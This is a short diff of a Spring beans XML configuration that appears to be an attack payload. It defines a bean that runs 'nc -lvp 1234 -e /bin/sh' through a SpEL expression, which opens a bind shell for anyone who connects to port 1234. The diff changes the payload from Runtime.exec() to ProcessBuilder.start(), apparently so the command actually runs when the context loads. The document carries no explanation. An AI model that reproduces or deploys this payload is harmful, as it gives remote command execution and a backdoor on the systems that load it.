@@ -4,8 +4,8 @@
      http://www.springframework.org/schema/beans
      http://www.springframework.org/schema/beans/spring-beans.xsd
 ">
-  <bean id="pb" class="java.lang.Runtime">
+  <bean id="pb" class="java.lang.ProcessBuilder">
      <constructor-arg value="nc -lvp 1234 -e /bin/sh" />
-     <property name="whatever" value="#{ pb.exec() }"/>
+     <property name="whatever" value="#{ pb.start() }"/>
   </bean>
 </beans>
